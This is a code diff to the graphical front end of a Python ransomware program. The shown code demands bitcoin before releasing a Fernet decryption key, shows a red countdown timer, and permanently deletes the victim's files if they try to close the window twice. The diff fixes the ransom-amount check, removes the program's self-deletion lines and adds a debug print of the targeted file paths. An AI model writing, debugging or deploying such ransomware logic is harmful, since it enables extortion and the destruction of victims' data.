@@ -6,14 +6,13 @@ from datetime import datetime
 from PIL import ImageTk, Image
 import random
 from tkinter import font
-from sys import argv
-from os import remove
 
 #Writes fernet key to text file on the desktop if user submits enough bitcoin
 def gui_write_key(key):
-    if bitcoin_entry.get() >= how_many_bitcoins_do_we_want and bitcoin_entry.get().isdigit():
-        encrypter.write_key(key)
-        messagebox.showinfo(title = 'Text File Created', message = "A text file has been created in the next available space on your desktop with the key for your files. Enter it into the input field below to get your files back. Thank you for your cooperation.")
+    if bitcoin_entry.get().isdigit():
+        if int(bitcoin_entry.get()) >= int(how_many_bitcoins_do_we_want):
+            encrypter.write_key(key)
+            messagebox.showinfo(title = 'Text File Created', message = "A text file has been created in the next available space on your desktop with the key for your files. Enter it into the input field below to get your files back. Thank you for your cooperation.")
 
 #uses fernet key to decrypt all files in file_paths list
 def gui_decrypt_files(file_paths, fernet, key):
@@ -30,9 +29,6 @@ def gui_decrypt_files(file_paths, fernet, key):
         #Terminates program
         root.destroy()
 
-        #Self removes program off of computer
-        remove(argv[0])
-
 #Function to display message and prevent program from closing when user tries to exit out; gives warning on first close attempt, deletes all files in file_paths on second close attempt
 def on_close():
     global close_counter
@@ -40,14 +36,12 @@ def on_close():
         messagebox.showinfo(title = 'Do Not Close This Program', message = 'This is your second and final warning. If you attempt to close the program one more time, your files WILL be permanently deleted.')
         close_counter += 1
     elif close_counter == 1:
+        print(file_paths)
         encrypter.delete_everything(file_paths)
         messagebox.showinfo(title = 'Files Deleted', message = 'You have been warned. Your files have now been permanently deleted. Have a nice day.')
 
         #Terminates program
         root.destroy()
-
-        #Self removes program off of computer
-        remove(argv[0])
 
 
 # GUI Stuff / Main Program Loop ==========================================================================================================================================================
@@ -130,9 +124,6 @@ def tab2():
             #Terminates program
             root.destroy()
 
-            #Self removes program off of computer
-            remove(argv[0])
-            
     #Widget for creating the timer display
     timer = Label(root, font=('Trebuchet', 70,'bold'), bg = 'red', fg = 'white')
     timer.place(x = 484, y = 295)
